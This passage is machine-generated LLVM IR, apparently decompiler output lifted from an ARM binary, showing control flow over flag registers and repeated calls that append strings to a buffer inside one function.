  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8828 = icmp ult i8 %v3_881c, 7
  store i1 %v6_8828, i1* %cpsr_n.global-to-local, align 1
  %v7_8828 = icmp eq i8 %v3_881c, 7
  store i1 %v7_8828, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8828, label %dec_label_pc_940c, label %dec_label_pc_8830

dec_label_pc_8830:                                ; preds = %dec_label_pc_8828
  %v2_8830 = icmp ugt i8 %v3_881c, 9
  store i1 %v2_8830, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8830 = icmp ult i8 %v3_881c, 10
  store i1 %v6_8830, i1* %cpsr_n.global-to-local, align 1
  %v7_8830 = icmp eq i8 %v3_881c, 10
  store i1 %v7_8830, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8830, label %dec_label_pc_961c, label %dec_label_pc_8838

dec_label_pc_8838:                                ; preds = %dec_label_pc_9510, %dec_label_pc_9950, %dec_label_pc_9a98, %dec_label_pc_9914, %dec_label_pc_8830, %dec_label_pc_87f4, %dec_label_pc_8858, %dec_label_pc_9d84, %dec_label_pc_9b34, %dec_label_pc_9a7c, %dec_label_pc_9934, %dec_label_pc_98fc, %dec_label_pc_9884, %dec_label_pc_9400, %dec_label_pc_88dc, %dec_label_pc_965c
  store i32 %v0_839c, i32* %r3.global-to-local, align 4
  %v1_8840 = add i32 %stack_var_-20832.0, 1
  store i32 %v1_8840, i32* %r2.global-to-local, align 4
  %v0_8844 = load i32, i32* @r8, align 4
  %v2_8848 = sub i32 %v1_8840, %v0_839c
  %v3_8848 = icmp uge i32 %v1_8840, %v0_839c
  store i1 %v3_8848, i1* %cpsr_c.global-to-local, align 1
  %v4_8848 = xor i32 %v1_8840, %v0_839c
  %v5_8848 = xor i32 %v2_8848, %v1_8840
  %v6_8848 = and i32 %v5_8848, %v4_8848
  %v7_8848 = icmp slt i32 %v6_8848, 0
  store i1 %v7_8848, i1* %cpsr_v.global-to-local, align 1
  %v8_8848 = icmp slt i32 %v2_8848, 0
  store i1 %v8_8848, i1* %cpsr_n.global-to-local, align 1
  %v9_8848 = icmp eq i32 %v1_8840, %v0_839c
  store i1 %v9_8848, i1* %cpsr_z.global-to-local, align 1
  %v1_8850 = add i32 %v0_8844, 3140
  store i32 %v1_8850, i32* @r8, align 4
  br i1 %v9_8848, label %dec_label_pc_8528, label %dec_label_pc_8858

dec_label_pc_8858:                                ; preds = %dec_label_pc_8838, %dec_label_pc_87e8
  %v0_8860 = phi i32 [ %stack_var_-20868.0.ph, %dec_label_pc_87e8 ], [ %v1_8850, %dec_label_pc_8838 ]
  %stack_var_-20832.0 = phi i32 [ %v1_87dc, %dec_label_pc_87e8 ], [ %v1_8840, %dec_label_pc_8838 ]
  %v1_8858 = add i32 %v0_8860, -1456
  %v2_8858 = inttoptr i32 %v1_8858 to i32*
  %v3_8858 = load i32, i32* %v2_8858, align 4
  store i32 %v3_8858, i32* %r0.global-to-local, align 4
  %v1_885c = add i32 %v3_8858, 1
  %v2_885c = icmp eq i32 %v3_8858, -1
  store i1 %v2_885c, i1* %cpsr_c.global-to-local, align 1
  %v3_885c = sub i32 0, %v3_8858
  %v4_885c = and i32 %v1_885c, %v3_885c
  %v5_885c = icmp slt i32 %v4_885c, 0
  store i1 %v5_885c, i1* %cpsr_v.global-to-local, align 1
  %v6_885c = icmp slt i32 %v1_885c, 0
  store i1 %v6_885c, i1* %cpsr_n.global-to-local, align 1
  %v7_885c = icmp eq i32 %v1_885c, 0
  store i1 %v7_885c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8858, i32* %sb.global-to-local, align 4
  br i1 %v7_885c, label %dec_label_pc_8838, label %dec_label_pc_8868

dec_label_pc_8868:                                ; preds = %dec_label_pc_8858
  %v3_8868 = udiv i32 %v3_8858, 32
  %v3_8870 = mul nuw nsw i32 %v3_8868, 4
  store i32 %v2_8748, i32* @lr, align 4
  %v2_8878 = add i32 %v3_8870, %v2_8748
  store i32 %v2_8878, i32* %r3.global-to-local, align 4
  %v1_887c = add i32 %v2_8878, -292
  %v2_887c = inttoptr i32 %v1_887c to i32*
  %v3_887c = load i32, i32* %v2_887c, align 4
  %v1_8880 = urem i32 %v3_8858, 32
  store i32 %v1_8880, i32* %r1.global-to-local, align 4
  %v2_8884 = add nsw i32 %v1_8880, -1
  %v3_8884 = shl i32 1, %v2_8884
  %v4_8884 = and i32 %v3_887c, %v3_8884
  %v5_8884 = icmp ne i32 %v4_8884, 0
  store i1 %v5_8884, i1* %cpsr_c.global-to-local, align 1
  %v6_8884 = lshr i32 %v3_887c, %v1_8880
  store i32 %v6_8884, i32* %r2.global-to-local, align 4
  %v1_8888 = urem i32 %v6_8884, 2
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_8888 = icmp eq i32 %v1_8888, 0
  store i1 %v2_8888, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8888, label %dec_label_pc_87f4, label %dec_label_pc_8890

dec_label_pc_8890:                                ; preds = %dec_label_pc_8868
  store i32 4, i32* @r4, align 4
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_88a8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 4, i32* %stack_var_-48, align 4
  store i32 %v2_88b4, i32* @lr, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v6_88c0 = call i32 @function_13e04(i32 %v3_8858, i32 1, i32 4, i32* nonnull %stack_var_-44, i32 %v2_88b4)
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_88c8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_88c8, i32* %r3.global-to-local, align 4
  %v2_88cc = or i32 %v3_88c8, %v6_88c0
  store i32 %v2_88cc, i32* %r0.global-to-local, align 4
  %v3_88cc = icmp slt i32 %v2_88cc, 0
  store i1 %v3_88cc, i1* %cpsr_n.global-to-local, align 1
  %v4_88cc = icmp eq i32 %v2_88cc, 0
  store i1 %v4_88cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_88cc, label %.thread38, label %dec_label_pc_88dc

.thread38:                                        ; preds = %dec_label_pc_8890
  %v1_88d0 = load i32, i32* @r8, align 4
  %v2_88d0 = add i32 %v1_88d0, -1456
  %v3_88d0 = inttoptr i32 %v2_88d0 to i32*
  %v4_88d0 = load i32, i32* %v3_88d0, align 4
  store i32 %v4_88d0, i32* %r0.global-to-local, align 4
  %v1_88d4 = load i32, i32* @r4, align 4
  %v2_88d4 = trunc i32 %v1_88d4 to i8
  %v4_88d4 = add i32 %v1_88d0, -1452
  %v5_88d4 = inttoptr i32 %v4_88d4 to i8*
  store i8 %v2_88d4, i8* %v5_88d4, align 1
  %v0_88d8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_88d8.pr.pr, label %.thread38.dec_label_pc_87f4_crit_edge, label %dec_label_pc_88dc

.thread38.dec_label_pc_87f4_crit_edge:            ; preds = %.thread38
  %v0_87f4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_87f4

dec_label_pc_88dc:                                ; preds = %dec_label_pc_8890, %.thread38
  %v0_88dc = load i32, i32* @r8, align 4
  %v1_88dc = add i32 %v0_88dc, -1456
  %v2_88dc = inttoptr i32 %v1_88dc to i32*
  %v3_88dc = load i32, i32* %v2_88dc, align 4
  store i32 %v3_88dc, i32* %r0.global-to-local, align 4
  %v1_88e0 = call i32 @function_13654(i32 %v3_88dc)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_88e8 = load i32, i32* @r8, align 4
  %v2_88e8 = add i32 %v1_88e8, -1456
  %v3_88e8 = inttoptr i32 %v2_88e8 to i32*
  store i32 -1, i32* %v3_88e8, align 4
  %v0_88ec = load i32, i32* @r5, align 4
  %v1_88ec = trunc i32 %v0_88ec to i8
  %v2_88ec = load i32, i32* @r8, align 4
  %v3_88ec = add i32 %v2_88ec, -1452
  %v4_88ec = inttoptr i32 %v3_88ec to i8*
  store i8 %v1_88ec, i8* %v4_88ec, align 1
  br label %dec_label_pc_8838

dec_label_pc_88f4:                                ; preds = %dec_label_pc_8650
  %v1_88f4 = add i32 %v3_8900, 25
  %v2_88f4 = inttoptr i32 %v1_88f4 to i32*
  %v3_88f4 = load i32, i32* %v2_88f4, align 4
  store i32 %v3_88f4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_88f8 = icmp slt i32 %v3_88f4, 0
  store i1 %v1_88f8, i1* %cpsr_n.global-to-local, align 1
  %v2_88f8 = icmp eq i32 %v3_88f4, 0
  store i1 %v2_88f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_88f8, label %.thread43, label %.thread41

.thread41:                                        ; preds = %dec_label_pc_88f4
  store i32 4, i32* %r3.global-to-local, align 4
  store i8 4, i8* %v2_8650, align 1
  %v0_8904.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8904.pr.pr, label %.thread41..thread43_crit_edge, label %dec_label_pc_890c

.thread41..thread43_crit_edge:                    ; preds = %.thread41
  %v1_8904.pre = load i32, i32* %r3.global-to-local, align 4
  %v3_8904.pre = load i32, i32* @r6, align 4
  %extract.t = trunc i32 %v1_8904.pre to i8
  br label %.thread43

.thread43:                                        ; preds = %.thread41..thread43_crit_edge, %dec_label_pc_88f4
  %v3_8904 = phi i32 [ %v3_8904.pre, %.thread41..thread43_crit_edge ], [ %v3_8900, %dec_label_pc_88f4 ]
  %v1_8904.off0 = phi i8 [ %extract.t, %.thread41..thread43_crit_edge ], [ 0, %dec_label_pc_88f4 ]
  %v4_8904 = add i32 %v3_8904, -1427
  %v5_8904 = inttoptr i32 %v4_8904 to i8*
  store i8 %v1_8904.off0, i8* %v5_8904, align 1
  %v0_8908.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8908.pr, label %.thread43.dec_label_pc_8664_crit_edge, label %dec_label_pc_890c

.thread43.dec_label_pc_8664_crit_edge:            ; preds = %.thread43
  %v0_8664.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8664

dec_label_pc_890c:                                ; preds = %.thread41, %.thread43, %dec_label_pc_85c0
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_8914 = load i32, i32* @r7, align 4
  %v1_8914 = add i32 %v0_8914, 2112
  store i32 %v1_8914, i32* %r0.global-to-local, align 4
  %v1_8918 = load i32, i32* @r6, align 4
  %v2_8918 = add i32 %v1_8918, 33
  %v3_8918 = inttoptr i32 %v2_8918 to i32*
  store i32 -1, i32* %v3_8918, align 4
  %v0_891c = load i32, i32* %r0.global-to-local, align 4
  %v1_891c = add i32 %v0_891c, 4
  store i32 %v1_891c, i32* %r0.global-to-local, align 4
  store i32 1024, i32* %r1.global-to-local, align 4
  %v0_8924 = load i32, i32* @r5, align 4
  %v1_8924 = load i32, i32* @r6, align 4
  %v2_8924 = add i32 %v1_8924, 21
  %v3_8924 = inttoptr i32 %v2_8924 to i32*
  store i32 %v0_8924, i32* %v3_8924, align 4
  %v2_8928 = call i32 @function_12d34(i32 %v1_891c, i32 1024)
  store i32 10240, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v0_8934 = load i32, i32* @r5, align 4
  %v1_8934 = load i32, i32* @r6, align 4
  %v2_8934 = add i32 %v1_8934, 681
  %v3_8934 = inttoptr i32 %v2_8934 to i32*
  store i32 %v0_8934, i32* %v3_8934, align 4
  %v2_8938 = call i32 @function_12d34(i32 %stack_var_-20856.0.ph, i32 10240)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8940 = call i32 @function_12c94(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  %v0_8948 = load i32, i32* @r6, align 4
  store i32 %v0_8948, i32* %r1.global-to-local, align 4
  %v2_894c = add i32 %v2_8940, %stack_var_-20856.0.ph
  store i32 %v2_894c, i32* @r0, align 4
  %v2_8950 = inttoptr i32 %v2_894c to i8*
  %v3_8950 = call i32 @function_12cbc(i8* %v2_8950, i32 %v0_8948)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8958 = call i32 @function_12c94(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f14.28 to i32), i32* %r1.global-to-local, align 4
  %v2_8964 = add i32 %v2_8958, %stack_var_-20856.0.ph
  store i32 %v2_8964, i32* @r0, align 4
  %v2_8968 = inttoptr i32 %v2_8964 to i8*
  %v3_8968 = call i32 @function_12cbc(i8* %v2_8968, i32 ptrtoint (i32* @global_var_15f14.28 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8970 = call i32 @function_12c94(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  %v0_8978 = load i32, i32* @r7, align 4
  %v1_8978 = add i32 %v0_8978, 532
  store i32 %v1_8978, i32* %r1.global-to-local, align 4
  %v2_897c = add i32 %v2_8970, %stack_var_-20856.0.ph
  store i32 %v2_897c, i32* @r0, align 4
  %v2_8980 = inttoptr i32 %v2_897c to i8*
  %v3_8980 = call i32 @function_12cbc(i8* %v2_8980, i32 %v1_8978)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8988 = call i32 @function_12c94(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_15eec.30 to i32), i32* %r1.global-to-local, align 4
  %v2_8994 = add i32 %v2_8988, %stack_var_-20856.0.ph
  store i32 %v2_8994, i32* @r0, align 4
  %v3_8998 = inttoptr i32 %v2_8994 to i8*
  %v4_8998 = call i32 @function_12cbc(i8* %v3_8998, i32 ptrtoint ([24 x i8]* @global_var_15eec.30 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_89a0 = call i32 @function_12c94(i8* %v1_8940)
  %v2_89a8 = add i32 %v2_89a0, %stack_var_-20856.0.ph
  store i32 %v2_89a8, i32* @r0, align 4
  %v0_89ac = load i32, i32* @r7, align 4
  %v1_89ac = add i32 %v0_89ac, 20
  store i32 %v1_89ac, i32* %r1.global-to-local, align 4
  %v2_89b0 = inttoptr i32 %v2_89a8 to i8*
  %v3_89b0 = call i32 @function_12cbc(i8* %v2_89b0, i32 %v1_89ac)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_89b8 = call i32 @function_12c94(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_15f04.32 to i32), i32* %r1.global-to-local, align 4
  %v2_89c4 = add i32 %v2_89b8, %stack_var_-20856.0.ph
  store i32 %v2_89c4, i32* @r0, align 4
  %v3_89c8 = inttoptr i32 %v2_89c4 to i8*
  %v4_89c8 = call i32 @function_12cbc(i8* %v3_89c8, i32 ptrtoint ([9 x i8]* @global_var_15f04.32 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_89d0 = call i32 @function_12c94(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  %v0_89d8 = load i32, i32* @r7, align 4
  %v2_89dc = add i32 %v2_89d0, %stack_var_-20856.0.ph
  store i32 %v2_89dc, i32* @r0, align 4
  %v1_89e0 = add i32 %v0_89d8, 789
  store i32 %v1_89e0, i32* %r1.global-to-local, align 4
  %v2_89e4 = inttoptr i32 %v2_89dc to i8*
  %v3_89e4 = call i32 @function_12cbc(i8* %v2_89e4, i32 %v1_89e0)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_89ec = call i32 @function_12c94(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r1.global-to-local, align 4
  %v2_89f8 = add i32 %v2_89ec, %stack_var_-20856.0.ph
  store i32 %v2_89f8, i32* @r0, align 4
  %v3_89fc = inttoptr i32 %v2_89f8 to i8*
  %v4_89fc = call i32 @function_12cbc(i8* %v3_89fc, i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32))
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_8a04 = call i32 @function_1236c(i32 32)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a0c = call i32 @function_12c94(i8* %v1_8940)
  %v0_8a10 = load i32, i32* @r5, align 4
  store i32 %v0_8a10, i32* %r1.global-to-local, align 4
  store i32 %v2_8a0c, i32* @r4, align 4
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_8a1c = inttoptr i32 %v0_8a10 to i32*
  %v3_8a1c = call i32 @function_12288(i32 32, i32* %v2_8a1c)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 %v3_8a1c, i32* %r1.global-to-local, align 4
  %v1_8a28 = load i32, i32* @r4, align 4
  %v2_8a28 = add i32 %v1_8a28, %stack_var_-20856.0.ph
  store i32 %v2_8a28, i32* @r0, align 4
  %v2_8a2c = inttoptr i32 %v2_8a28 to i8*
  %v3_8a2c = call i32 @function_12cbc(i8* %v2_8a2c, i32 %v3_8a1c)
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_8a34 = call i32 @function_122b4(i32 32)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a3c = call i32 @function_12c94(i8* %v1_8940)
  %v2_8a44 = add i32 %v2_8a3c, %stack_var_-20856.0.ph
  store i32 %v2_8a44, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r1.global-to-local, align 4
  %v3_8a4c = inttoptr i32 %v2_8a44 to i8*
  %v4_8a4c = call i32 @function_12cbc(i8* %v3_8a4c, i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32))
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_8a54 = call i32 @function_1236c(i32 33)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a5c = call i32 @function_12c94(i8* %v1_8940)
  %v0_8a60 = load i32, i32* @r5, align 4
  store i32 %v0_8a60, i32* %r1.global-to-local, align 4
  store i32 %v2_8a5c, i32* @r4, align 4
  store i32 33, i32* %r0.global-to-local, align 4
  %v2_8a6c = inttoptr i32 %v0_8a60 to i32*
  %v3_8a6c = call i32 @function_12288(i32 33, i32* %v2_8a6c)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8a6c, i32* %r1.global-to-local, align 4
  %v1_8a78 = load i32, i32* @r4, align 4
  %v2_8a78 = add i32 %v1_8a78, %stack_var_-20856.0.ph
  store i32 %v2_8a78, i32* @r0, align 4
  %v2_8a7c = inttoptr i32 %v2_8a78 to i8*
  %v3_8a7c = call i32 @function_12cbc(i8* %v2_8a7c, i32 %v3_8a6c)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_8a84 = call i32 @function_122b4(i32 33)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a8c = call i32 @function_12c94(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r1.global-to-local, align 4
  %v2_8a98 = add i32 %v2_8a8c, %stack_var_-20856.0.ph
  store i32 %v2_8a98, i32* @r0, align 4
  %v3_8a9c = inttoptr i32 %v2_8a98 to i8*
  %v4_8a9c = call i32 @function_12cbc(i8* %v3_8a9c, i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32))
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_8aa4 = call i32 @function_1236c(i32 34)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8aac = call i32 @function_12c94(i8* %v1_8940)
  %v0_8ab0 = load i32, i32* @r5, align 4
  store i32 %v0_8ab0, i32* %r1.global-to-local, align 4
  store i32 %v2_8aac, i32* @r4, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  %v2_8abc = inttoptr i32 %v0_8ab0 to i32*
  %v3_8abc = call i32 @function_12288(i32 34, i32* %v2_8abc)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_8abc, i32* %r1.global-to-local, align 4
  %v1_8ac8 = load i32, i32* @r4, align 4
  %v2_8ac8 = add i32 %v1_8ac8, %stack_var_-20856.0.ph
  store i32 %v2_8ac8, i32* @r0, align 4
  %v2_8acc = inttoptr i32 %v2_8ac8 to i8*
  %v3_8acc = call i32 @function_12cbc(i8* %v2_8acc, i32 %v3_8abc)
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_8ad4 = call i32 @function_122b4(i32 34)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8adc = call i32 @function_12c94(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %lr.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r1.global-to-local, align 4
  %v2_8ae8 = add i32 %v2_8adc, %stack_var_-20856.0.ph
  store i32 %v2_8ae8, i32* @r0, align 4
  %v3_8aec = inttoptr i32 %v2_8ae8 to i8*
  %v4_8aec = call i32 @function_12cbc(i8* %v3_8aec, i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32))
  store i32 %v4_8aec, i32* %r0.global-to-local, align 4
  store i32 %v6_8200, i32* %r1.global-to-local, align 4
  %v1_8af4 = load i32, i32* @r5, align 4
  %v2_8af4 = sub i32 %v6_8200, %v1_8af4
  %v3_8af4 = icmp uge i32 %v6_8200, %v1_8af4
  store i1 %v3_8af4, i1* %cpsr_c.global-to-local, align 1
  %v4_8af4 = xor i32 %v1_8af4, %v6_8200
  %v5_8af4 = xor i32 %v2_8af4, %v6_8200
  %v6_8af4 = and i32 %v5_8af4, %v4_8af4
  %v7_8af4 = icmp slt i32 %v6_8af4, 0
  store i1 %v7_8af4, i1* %cpsr_v.global-to-local, align 1
  %v8_8af4 = icmp slt i32 %v2_8af4, 0
  store i1 %v8_8af4, i1* %cpsr_n.global-to-local, align 1
  %v9_8af4 = icmp eq i32 %v6_8200, %v1_8af4
  store i1 %v9_8af4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8af4, label %dec_label_pc_8bcc, label %dec_label_pc_8afc

dec_label_pc_8afc:                                ; preds = %dec_label_pc_890c
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_8b00 = call i32 @function_1236c(i32 35)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b08 = call i32 @function_12c94(i8* %v1_8940)
  %v0_8b0c = load i32, i32* @r5, align 4
  store i32 %v0_8b0c, i32* %r1.global-to-local, align 4
  store i32 %v2_8b08, i32* @r4, align 4
  store i32 35, i32* %r0.global-to-local, align 4
  %v2_8b18 = inttoptr i32 %v0_8b0c to i32*
  %v3_8b18 = call i32 @function_12288(i32 35, i32* %v2_8b18)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8b18, i32* %r1.global-to-local, align 4
  %v1_8b24 = load i32, i32* @r4, align 4
  %v2_8b24 = add i32 %v1_8b24, %stack_var_-20856.0.ph
  store i32 %v2_8b24, i32* @r0, align 4
  %v2_8b28 = inttoptr i32 %v2_8b24 to i8*
  %v3_8b28 = call i32 @function_12cbc(i8* %v2_8b28, i32 %v3_8b18)
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_8b30 = call i32 @function_122b4(i32 35)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b38 = call i32 @function_12c94(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r1.global-to-local, align 4
  %v2_8b44 = add i32 %v2_8b38, %stack_var_-20856.0.ph
  store i32 %v2_8b44, i32* @r0, align 4
  %v3_8b48 = inttoptr i32 %v2_8b44 to i8*
  %v4_8b48 = call i32 @function_12cbc(i8* %v3_8b48, i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32))
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b50 = call i32 @function_12c94(i8* %v1_8940)
  %v0_8b54 = load i32, i32* @r5, align 4
  store i32 %v0_8b54, i32* %r1.global-to-local, align 4
  store i32 %v2_8b50, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v2_8b60 = inttoptr i32 %v0_8b54 to i32*
  %v3_8b60 = call i32 @function_12288(i32 40, i32* %v2_8b60)
  store i32 %stack_var_-20856.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_8b60, i32* %r1.global-to-local, align 4
  %v2_8b6c = add i32 %v2_8b50, %stack_var_-20856.0.ph
  store i32 %v2_8b6c, i32* @r0, align 4
  %v2_8b70 = inttoptr i32 %v2_8b6c to i8*
  %v3_8b70 = call i32 @function_12cbc(i8* %v2_8b70, i32 %v3_8b60)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b78 = call i32 @function_12c94(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_15f14.28 to i32), i32* %r1.global-to-local, align 4
  %v2_8b84 = add i32 %v2_8b78, %stack_var_-20856.0.ph
  store i32 %v2_8b84, i32* @r0, align 4
  %v2_8b88 = inttoptr i32 %v2_8b84 to i8*
  %v3_8b88 = call i32 @function_12cbc(i8* %v2_8b88, i32 ptrtoint (i32* @global_var_15f14.28 to i32))
  store i32 %v6_8200, i32* %r0.global-to-local, align 4
  %v2_8b90 = call i32 @function_12c94(i8* %v1_8b90)
  store i32 %v2_8b90, i32* @r4, align 4
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b9c = call i32 @function_12c94(i8* %v1_8940)
  %v2_8ba4 = add i32 %v2_8b9c, %stack_var_-20856.0.ph
  store i32 %v2_8ba4, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v0_8bac = load i32, i32* @r4, align 4
  store i32 %v0_8bac, i32* %r0.global-to-local, align 4
  %v3_8bb0 = trunc i32 %v0_8bac to i8
  %v4_8bb0 = call i32 @function_13188(i8 %v3_8bb0, i32 10, i32 %v2_8ba4)
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8bb8 = call i32 @function_12c94(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), i32* %r1.global-to-local, align 4
  %v2_8bc4 = add i32 %v2_8bb8, %stack_var_-20856.0.ph
  store i32 %v2_8bc4, i32* @r0, align 4
  %v3_8bc8 = inttoptr i32 %v2_8bc4 to i8*
  %v4_8bc8 = call i32 @function_12cbc(i8* %v3_8bc8, i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32))
  store i32 %v4_8bc8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8bcc

dec_label_pc_8bcc:                                ; preds = %dec_label_pc_890c, %dec_label_pc_8afc
  %v0_8bcc = load i32, i32* @r6, align 4
  %v1_8bcc = add i32 %v0_8bcc, 37
  %v2_8bcc = inttoptr i32 %v1_8bcc to i32*
  %v3_8bcc = load i32, i32* %v2_8bcc, align 4
  store i32 %v3_8bcc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_8bd0 = icmp slt i32 %v3_8bcc, 0
  store i1 %v1_8bd0, i1* %cpsr_n.global-to-local, align 1
  %v2_8bd0 = icmp eq i32 %v3_8bcc, 0
  store i1 %v2_8bd0, i1* %cpsr_z.global-to-local, align 1
  %tmp208 = icmp slt i32 %v3_8bcc, 1
  br i1 %tmp208, label %dec_label_pc_8c78, label %dec_label_pc_8bd8

dec_label_pc_8bd8:                                ; preds = %dec_label_pc_8bcc
  store i32 %stack_var_-20856.0.ph, i32* %r0.global-to-local, align 4
  %v2_8bdc = call i32 @function_12c94(i8* %v1_8940)
  store i32 %stack_var_-20856.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_15f24.36 to i32), i32* %r1.global-to-local, align 4
  %v2_8be8 = add i32 %v2_8bdc, %stack_var_-20856.0.ph
  store i32 %v2_8be8, i32* @r0, align 4
  %v3_8bec = inttoptr i32 %v2_8be8 to i8*
  %v4_8bec = call i32 @function_12cbc(i8* %v3_8bec, i32 ptrtoint ([9 x i8]* @global_var_15f24.36 to i32))
  store i32 %v4_8bec, i32* %r0.global-to-local, align 4
  %v0_8bf0 = load i32, i32* @r6, align 4
  %v1_8bf0 = add i32 %v0_8bf0, 37
  %v2_8bf0 = inttoptr i32 %v1_8bf0 to i32*
  %v3_8bf0 = load i32, i32* %v2_8bf0, align 4
  store i32 %v3_8bf0, i32* %r3.global-to-local, align 4
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
